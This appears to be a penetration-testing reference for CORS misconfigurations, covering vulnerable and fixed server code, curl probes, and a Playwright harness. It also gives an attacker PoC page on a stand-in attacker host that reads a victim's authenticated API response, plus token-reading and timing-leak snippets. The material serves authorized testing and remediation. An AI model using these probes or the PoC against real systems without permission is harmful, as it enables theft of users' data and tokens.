# CORS Misconfiguration — Vulnerability Class Reference

> Complete detection, validation, and exploitation reference for CORS misconfigurations.
> All HTTP traffic via Caido proxy (`-x "http://localhost:8080"`).
> Browser validation mandatory via Playwright.

---

## Root Cause

Server fails to validate `Origin` header against strict allowlist before setting `Access-Control-Allow-Origin` (ACAO) and `Access-Control-Allow-Credentials` (ACAC).

```javascript
// VULNERABLE — reflects any Origin
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});

// SECURE — strict allowlist
const ALLOWED = new Set(['https://app.target.com', 'https://admin.target.com']);
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');
  }
  next();
});
```

---

## Variants

| Variant | Description | Detection |
|---------|-------------|-----------|
| **V1: Arbitrary Reflection** | Reflects any `Origin` | `Origin: https://attacker.example` → ACAO reflected |
| **V2: Null Origin Trust** | Trusts `Origin: null` | Sandboxed iframe test |
| **V3: Weak Validation** | Substring/prefix/suffix matching | Parser differential testing |
| **V4: Subdomain Trust** | `*.example.com` or all subdomains | Subdomain takeover check |
| **V5: HTTP Origin** | Trusts HTTP on HTTPS API | Mixed-content + cookie test |
| **V6: Wildcard ACAO** | `ACAO: *` (no credentials) | Unauthenticated sensitive data? |
| **V7: Credentialed CORS** | Reflected origin + `ACAC: true` | Browser test required |
| **V8: Error-Response CORS** | Different CORS on 401/403/500 | Test error endpoints |

---

## Testing Checklist (via Caido)

### Phase 1: Basic Origin Testing

```bash
TARGET="https://target.com/api/profile"

# 1. Untrusted origin
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Origin: https://attacker.example" "$TARGET"

# 2. Null origin
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Origin: null" "$TARGET"

# 3. Trusted origin (baseline)
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Origin: https://app.target.com" "$TARGET"

# 4. HTTP origin
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Origin: http://target.com" "$TARGET"

# 5. Subdomain variants
for o in "https://sub.target.com" "https://target.com.attacker.example" "https://target-example.com"; do
  curl -x "http://localhost:8080" -sS -D - -o /dev/null -H "Origin: $o" "$TARGET"
done
```

### Phase 2: Preflight Testing

```bash
curl -x "http://localhost:8080" -i -X OPTIONS \
  -H "Origin: https://attacker.example" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: authorization,content-type" \
  "https://target.com/api/profile"

# Check: ACAO, ACAC, Allow-Methods, Allow-Headers, Max-Age
```

### Phase 3: Credentialed Testing

```bash
# With test account session cookie
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Origin: https://attacker.example" \
  -H "Cookie: session=TEST_ACCOUNT_SESSION" \
  "https://target.com/api/profile"

# Verify: cookies sent + response readable
```

### Phase 4: Authentication-State Differential

```bash
# Test each auth state
STATES=("logged_out" "account_a" "account_b" "expired" "revoked")
for state in "${STATES[@]}"; do
  COOKIE=$(get_cookie "$state")
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    -H "Origin: https://attacker.example" -H "Cookie: $COOKIE" "$TARGET"
done
```

---

## Browser Validation (MANDATORY)

### Playwright Validation

```javascript
// cors-validation.js
const { chromium, firefox, webkit } = require('playwright');

const TARGET = 'https://target.com/api/profile';
const ATTACKER = 'https://attacker.example';

async function test(browserType, name) {
  const browser = await browserType.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  // Login
  await page.goto('https://target.com/login');
  await page.fill('input[name="email"]', process.env.TEST_EMAIL);
  await page.fill('input[name="password"]', process.env.TEST_PASS);
  await page.click('button[type="submit"]');
  await page.waitForURL('**/dashboard');

  // Load PoC
  await page.goto(`${ATTACKER}/cors-poc.html`);
  const result = await page.evaluate(() => window.__corsResult);

  console.log(name, '=>', JSON.stringify(result));
  await browser.close();
}

(async () => {
  await test(chromium, 'Chromium');
  await test(firefox, 'Firefox');
  await test(webkit, 'WebKit');
})();
```

### Attacker PoC Page

```html
<!-- cors-poc.html on attacker.example -->
<script>
window.__corsResult = null;
fetch("https://target.com/api/profile", { credentials: "include" })
  .then(r => r.text().then(b => window.__corsResult = { ok: true, status: r.status, body: b }))
  .catch(e => window.__corsResult = { ok: false, error: String(e) });
</script>
```

### Browser Matrix Documentation

| Browser | Exploitable | Notes |
|---------|-------------|-------|
| Chrome 130+ | ✅/❌ | 3rd-party cookie phase-out |
| Firefox 131+ | ✅/❌ | Total Cookie Protection |
| Safari 17+ | ✅/❌ | ITP strict |
| Edge 130+ | ✅/❌ | Mirrors Chrome |

---

## Advanced Techniques

### 1. Origin Parser Differential

```bash
# Test parser differences
ORIGINS=(
  "https://TARGET.COM"
  "https://target.com."
  "https://target.com:443"
  "https://target.com@attacker.example"
  "https://target.com.attacker.example"
  "https://target-example.com"
)

for o in "${ORIGINS[@]}"; do
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    -H "Origin: $o" "$TARGET" | grep -i access-control-allow-origin
done

# Must find browser-realistic payload reaching same unsafe decision
```

### 2. Redirect-Chain CORS

```bash
# Test redirects on sensitive endpoints
curl -x "http://localhost:8080" -sS -D - -o /dev/null -L \
  -H "Origin: https://attacker.example" "$TARGET"
# Check each redirect's CORS headers
```

### 3. CDN/Proxy/WAF Inconsistencies

```bash
# Check for duplicate headers, cache behavior
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Origin: https://attacker.example" "$TARGET" | \
  grep -iE 'access-control-|vary:|age:|via:|x-cache:|server:'

# Repeat request - check cached response reuse across origins
```

### 4. Error-Response CORS

```bash
# Test different status codes
for code in 401 403 404 500; do
  # Trigger specific error
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    -H "Origin: https://attacker.example" "$TARGET"
done
```

### 5. DNS Rebinding + CORS

```bash
# Check if target validates Host header
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Host: internal-target" "$TARGET"
# If no Host validation + permissive CORS = DNS rebinding path
```

### 6. XS-Leaks + CORS

```javascript
// Timing attack under no-cors
async function probe(url) {
  const t0 = performance.now();
  try {
    await fetch(url, { credentials: "include", mode: "no-cors" });
    return { status: "loaded", time: performance.now() - t0 };
  } catch (e) {
    return { status: "error", time: performance.now() - t0 };
  }
}
```

### 7. Access-Control-Expose-Headers

```bash
# Check for sensitive header exposure
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Origin: https://attacker.example" "$TARGET" | \
  grep -i access-control-expose-headers

# Test reading exposed headers
fetch("https://target.com/api/login", { credentials: "include", method: "POST" })
  .then(r => console.log("Token:", r.headers.get("X-Auth-Token")));
```

### 8. Timing-Allow-Origin

```bash
# Check for resource timing leaks
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "$TARGET" | grep -i timing-allow-origin
```

---

## Chain Escalation

| Finding | Chain Required | Severity |
|---------|---------------|----------|
| Credentialed CORS + sensitive API | None (direct) | High/Critical |
| CORS + IDOR on same endpoint | IDOR | Critical |
| CORS + XSS on trusted subdomain | XSS | Critical |
| CORS + subdomain takeover | Subdomain takeover | Critical |
| CORS + token in Expose-Headers | Token theft | High |
| Wildcard ACAO + unauthenticated PII | None | Medium |

---

## False Positive Elimination

| Observation | Why Not Vulnerable | Required Validation |
|-------------|-------------------|---------------------|
| `ACAO: *` | No credentialed sharing | Unauthenticated sensitive data? |
| `ACAC: true` alone | No untrusted origin allowed | Combined with reflected ACAO? |
| Reflected Origin | May not carry credentials | Test with test account |
| Permissive OPTIONS | Actual request may differ | Test actual GET/POST |
| curl succeeds | No browser CORS enforcement | Playwright test |
| Missing `Vary` | No cache poisoning proven | Demonstrate cross-origin reuse |

---

## Reporting

### Title
```
CORS Misconfiguration Allows Untrusted Origin to Read Sensitive Authenticated API Response
```

### Evidence Required
1. Request with `Origin: https://attacker.example`
2. Response: `ACAO: https://attacker.example`, `ACAC: true`
3. Response body with test account sensitive data
4. Playwright validation output per browser
5. Cookie behavior (SameSite, Secure, 3rd-party)
6. Exact sensitive data exposed

### Severity
| Level | Criteria |
|-------|----------|
| **Critical** | Account compromise chain |
| **High** | Sensitive data readable (tokens, PII, billing) |
| **Medium** | Limited authenticated data |
| **Low** | Non-sensitive, restricted impact |
| **Info** | CORS headers present, no exposure |

### Remediation

```javascript
const ALLOWED = new Set(['https://app.target.com', 'https://admin.target.com']);

function validateOrigin(origin) {
  try {
    const url = new URL(origin);
    return ALLOWED.has(`${url.protocol}//${url.host}`);
  } catch { return false; }
}

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (validateOrigin(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');
  }
  next();
});
```

---

## Quick Reference

### Key Header Patterns

```
VULNERABLE:
Access-Control-Allow-Origin: https://attacker.example
Access-Control-Allow-Credentials: true

NOT VULNERABLE (alone):
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

SAFE:
Access-Control-Allow-Origin: https://trusted.example
Vary: Origin
```

### Caido Integration

```bash
# All via Caido proxy
curl -x "http://localhost:8080" ...
httpx -proxy "http://localhost:8080" ...
nuclei -proxy "http://localhost:8080" ...
katana -proxy "http://localhost:8080" ...
playwright # launch with Caido proxy context
```

### Tools

| Tool | Purpose |
|------|---------|
| `corsy` / `CORScanner` | Automated scanning |
| `nuclei` | Template-based detection |
| `playwright` | Browser validation |
| `Caido` | Request/response analysis |
| `Burp Suite` | Manual testing |